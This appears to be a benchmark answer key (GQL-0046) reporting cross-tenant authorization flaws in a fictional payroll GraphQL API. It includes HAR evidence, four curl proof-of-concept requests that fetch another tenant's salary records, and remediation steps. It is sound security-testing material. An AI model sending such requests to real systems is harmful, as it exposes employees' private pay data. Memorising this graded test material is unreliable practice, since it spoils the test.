# Expected Response

## System
- Domain: HR / Payroll Processing
- System: WageFlow Payroll API
- Example ID: GQL-0046

## Priority Findings

### Finding 1: BOLA via Related/Linked Payroll Resource Access — getResource Without Ownership Check (Pattern 1.2)
**Severity:** Critical
**Category:** BOLA / Related Resource Access

**Summary:**
The `getResource` query on `POST /graphql` returns payroll record `R-2046` belonging to `tenant-fc59` when queried by `tenant-666f`. Per §5.0 (Pattern 1.2), the vulnerability class is related or linked resources: the resolver processes `resourceId` without verifying ownership, allowing an attacker to traverse from their own session to linked payroll records belonging to other tenants. The response exposes HR/payroll `sensitiveField` (salary/compensation data) and `internalNotes` belonging to `tenant-fc59`. In payroll processing, this constitutes a GDPR/HR data privacy breach.

**Evidence from HAR:**
- Request: `POST https://api.wageflow-payroll-api.example.com/graphql` (2026-04-13T16:22:34Z, 200 ms)
- JWT `x-tenant-id`: `tenant-666f` — attacker's identity
- Query payload: `getResource(id: "R-2046") { resourceId tenantId ownerId data { sensitiveField internalNotes } }` — victim's payroll record ID substituted
- Response HTTP status: `200 OK` — no authorization error
- Response `tenantId`: `tenant-fc59` — cross-tenant payroll data returned
- Response `ownerId`: `other-user-666ffc59`
- Response `sensitiveField`: `CONFIDENTIAL-666ffc59` — payroll sensitive data disclosed
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-666ffc59`

**Root Cause (§4.0 RISK-GQL-046 + §5.0):** "The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`." Pattern 1.2 expands on this: even when a resource is accessed as a related/linked object (e.g., an employee's payroll run linked from another record), the resolver does not re-validate ownership. Any `resourceId` — whether directly known or discovered through a linked reference — bypasses the tenant boundary.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-046 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 1.2 | Related/linked resources BOLA — resolver does not enforce ownership on linked IDs |
| HAR entry | request.postData | `getResource(id: "R-2046")` from `tenant-666f` |
| HAR entry | response.content | `tenantId: "tenant-fc59"`, `sensitiveField: "CONFIDENTIAL-666ffc59"`, `internalNotes: "Internal data exposed"` |

---

### Finding 2: Cross-Tenant Linked Children via getResourceWithChildren (Pattern 1.2 Escalation)
**Severity:** High
**Category:** BOLA / Graph Traversal

**Summary:**
The `getResourceWithChildren` query (§3.0) follows linked `items` without re-validating ownership at the child level. An attacker can retrieve the full child hierarchy of a cross-tenant payroll record obtained via Finding 1.

---

### Finding 3: Cross-Tenant Bulk Payroll Data Enumeration via bulkResourceLookup (Pattern 1.9)
**Severity:** High
**Category:** BOLA / Mass Enumeration

**Root Cause (§4.0):** "The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering."

---

## Steps to Reproduce

### Step 1 — Confirm attacker baseline (own payroll records)
```bash
curl -s -X POST https://api.wageflow-payroll-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-666f" \
  -d '{"query": "query { getResource(id: \"R-666f-001\") { resourceId tenantId data { sensitiveField } } }"}'
```
**Expected:** Returns `tenantId: "tenant-666f"` payroll record.

### Step 2 — Cross-tenant payroll record access (HAR attack)
```bash
curl -s -X POST https://api.wageflow-payroll-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-666f" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2046\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-fc59"`, `ownerId: "other-user-666ffc59"`, `sensitiveField: "CONFIDENTIAL-666ffc59"`, `internalNotes: "Internal data exposed"` — cross-tenant payroll data confirmed.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}], "data": {"getResource": null}}`.

### Step 3 — Traverse linked children of cross-tenant payroll record
```bash
curl -s -X POST https://api.wageflow-payroll-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-666f" \
  -d '{"query": "query { getResourceWithChildren(id: \"R-2046\") { resourceId tenantId items { ... on Item { id data } } } }"}'
```
**Vulnerable outcome:** Returns full `tenant-fc59` payroll record plus all linked child records (pay stubs, deduction items) — Pattern 1.2 linked resource traversal confirmed.
**Secure outcome:** HTTP 403 at root and child resolver levels.

### Step 4 — Bulk cross-tenant payroll enumeration
```bash
curl -s -X POST https://api.wageflow-payroll-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-666f" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2046\", \"R-fc59-002\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns payroll records from `tenant-fc59`.
**Secure outcome:** Only own-tenant records; cross-tenant IDs yield FORBIDDEN.

## Secure Outcome Verification
For **Step 2**, a correctly patched implementation MUST return:
```json
{
  "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }],
  "data": { "getResource": null }
}
```

## Remediation
1. **Resolver-level ownership check:** Apply `WHERE resource_id = $id AND tenant_id = $jwt.tenantId` in `getResource` and `getResourceWithChildren` (§4.0 RISK-GQL-046).
2. **Re-validate at child resolver level:** In `getResourceWithChildren`, re-check `tenant_id = $jwt.tenantId` for each linked child object before resolving `items`.
3. **Per-ID ownership filter in bulkResourceLookup:** Post-fetch, reject any result whose `tenant_id` ≠ JWT's `tenantId`.
4. **Redis cache key includes tenantId:** §2.0 caches by `resourceId` only — change to `resourceId:tenantId`.
5. **Automated regression tests:** Assert `tenant-666f` accessing `R-2046` via `getResource` or `getResourceWithChildren` returns FORBIDDEN; assert children of cross-tenant records are also FORBIDDEN.
